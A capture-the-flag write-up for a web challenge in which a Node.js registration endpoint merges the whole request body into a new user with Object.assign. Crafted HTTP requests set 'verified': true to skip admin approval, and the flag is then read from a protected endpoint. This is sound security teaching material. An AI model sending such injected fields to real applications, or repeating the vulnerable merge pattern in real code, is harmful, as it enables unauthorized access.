# Santa's Workshop - CTF Writeup

**Challenge:** Santa's Workshop  
**Author:** andreas  
**Category:** Web Security  
**Difficulty:** Medium  

## Challenge Description

> We've started working on a new website for Santa's Workshop. For the sake of security, only elves verified by Santa can access the website. We need you to perform a pentest for us, we can't afford any breaches before Christmas!

## Initial Analysis

Upon accessing the website, we're presented with a registration and login system for Santa's Workshop. The application appears to have an authentication system where new users must be "verified by Santa" before accessing the main workshop dashboard.

### Application Structure

The application consists of several endpoints:

- `/register` - User registration
- `/login` - User authentication
- `/workshop` - Main dashboard (requires authentication + verification)
- `/api/workshop/notices` - Protected endpoint containing sensitive information

### Source Code Analysis

Looking at the application code, we can see the registration flow:

```javascript
app.post("/api/workshop/register", async (req, res) => {
    try {
        const { username, password } = req.body;
                
        const userId = await createElf(req.body);  // vulnerable line
        
        addRoleToElf(userId, "elf");
        addRoleToElf(userId, "intern");
        
        res.json({
            success: true,
            message: "Elf registered successfully. Please wait for admin verification.",
        });
    } catch (error) {
        // Error handling...
    }
});
```

The `createElf` function in `utils.js`:

```javascript
async function createElf(elfData) {
    const defaults = {
        id: generateElfId(),
        verified: false
    };

    const elf = Object.assign(defaults, elfData);  // ⚠️ Mass Assignment Vulnerability
    elf.password = await bcrypt.hash(elf.password, 12);

    const stmt = db.prepare("INSERT INTO elf (id, username, password, verified) VALUES (?, ?, ?, ?)");
    stmt.run(elf.id, elf.username, elf.password, elf.verified ? 1 : 0);

    return elf.id;
}
```

## Vulnerability: Mass Assignment

The vulnerability exists in the `createElf` function where `Object.assign(defaults, elfData)` is used. This function merges all properties from `req.body` (elfData) into the defaults object, including properties that should not be user-controlled.

The intended flow is:

1. User registers with `username` and `password`
2. Account is created with `verified: false`
3. Admin manually verifies the account
4. User can then access protected endpoints

However, because `Object.assign` copies **all** properties from `req.body`, an attacker can inject the `verified` property directly during registration.

## Solution Discovery

The vulnerability was identified through source code analysis. When examining the registration endpoint, I noticed the following critical code:

**Location:** `/api/workshop/register` in `app.js` (line 86)

```javascript
const userId = await createElf(req.body);  // Passes entire req.body
```

**The vulnerable function in `utils.js`:**

```javascript
async function createElf(elfData) {
    const defaults = {
        id: generateElfId(),
        verified: false
    };

    const elf = Object.assign(defaults, elfData);  // mass assignment!
    elf.password = await bcrypt.hash(elf.password, 12);

    const stmt = db.prepare("INSERT INTO elf (id, username, password, verified) VALUES (?, ?, ?, ?)");
    stmt.run(elf.id, elf.username, elf.password, elf.verified ? 1 : 0);

    return elf.id;
}
```

The problem is that `Object.assign(defaults, elfData)` merges **all** properties from the user's request body into the defaults object. This means any property in the JSON request will overwrite the defaults, including security-critical fields like `verified`.

## Exploitation

### Step 1: Register with Verified Flag

Instead of sending a normal registration request, we inject the `verified` property:

```http
POST /api/workshop/register HTTP/2
Host: 730f2b0dfb1d7761.julec.tf
Content-Type: application/json

{
  "username": "hacker",
  "password": "password123",
  "verified": true
}
```

Or using integer value:

```json
{
  "username": "hacker",
  "password": "password123",
  "verified": 1
}
```

The server accepts this request and creates an account with `verified=1`, bypassing the admin verification requirement entirely.

### Step 2: Login

```http
POST /api/workshop/login HTTP/2
Host: 730f2b0dfb1d7761.julec.tf
Content-Type: application/json

{
  "username": "hacker",
  "password": "password123"
}
```

### Step 3: Access Protected Content

Now that we're logged in with a verified account, we can access the `/api/workshop/notices` endpoint:

```http
GET /api/workshop/notices HTTP/2
Host: 730f2b0dfb1d7761.julec.tf
Cookie: connect.sid=<your-session-cookie>
```

This endpoint returns:

```json
{
  "notices": [
    {
      "id": 0,
      "message": "Here is a thank you to all the elves who have worked extra hard this season: <b>JUL{th4nk_y0u_f0r_th3_p3nt3st1ng}</b>"
    }
  ]
}
```

## Flag

**JUL{th4nk_y0u_f0r_th3_p3nt3st1ng}**

## Impact

This mass assignment vulnerability allows any attacker to:

- Bypass the admin verification process
- Gain immediate access to protected resources
- Access sensitive information meant only for verified users

## Tools Used

- Burp Suite (for request interception and manipulation)
- Browser Developer Tools
- curl/httpie (for API testing)

---

**Date Solved:** December 6, 2025  
**Time to Solve:** ~15 minutes after identifying the mass assignment vulnerability
